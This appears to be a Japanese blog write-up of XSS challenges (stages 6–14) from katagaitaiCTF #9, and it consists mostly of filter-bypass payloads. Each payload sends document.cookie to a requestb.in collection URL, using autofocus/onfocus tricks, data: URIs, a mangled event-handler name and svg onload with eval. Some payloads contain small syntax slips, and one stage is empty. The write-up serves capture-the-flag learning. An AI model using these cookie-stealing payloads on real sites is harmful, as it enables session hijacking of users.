---
layout: post
title: "katagaitaiCTF #9 XSS Knock Writeup"
date: 2017-08-29 21:00:00 +0900
tags: ctf
---

## katagaitaiCTF #9 XSS Knock Writeup

katagaitaiCTF #9 (https://atnd.org/events/89434)に参加してきました。WebのXSS千本ノックのWriteupを書きます。
State13まで解きました. メモがRequestbinのデータしかない...

参考

* [OWASP XSS Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [Kinugawaさん 資料](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)

Kinugawaさんの見てるだけでも、こんなバイパスの仕方あるのかー、こんな発想思いつかん、という感じ
## Stage6	
onfocusでlocation.hrefを設定して、autofocusにすることでonfocusを呼び出す。

```
?q='onfocus=location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie); autofocus=""
```

## Stage7

```
?q='onfocus=location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie); autofocus=""
```

## Stage8



## Stage9
```
?q="data:text/html,<script>location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie);</script>"
```

## Stage10
```
?q=<input type="text" onfscriptocus="location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie);" autofocus="">
```

## Stage11
```
?q=<input type="text" onfscriptocus="location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie);" autofocus="">
```


## Stage12
```
?q=<input type="text" onfscriptocus="location.href='https://requestb.in/ua35oeua?q='.concat(document.cookie);" autofocus="">
```

## Stage13
```
?q='); location.href='https://requestb.in/ua35oeua?q='concat(document.cookie);alert('1
```

## Stage14
```
?q=<svg onload=eval(URL.slice(105))> 
#<script>location.href='https://requestb.in/ua35oeua?q='concat(document.cookie);</script>
```
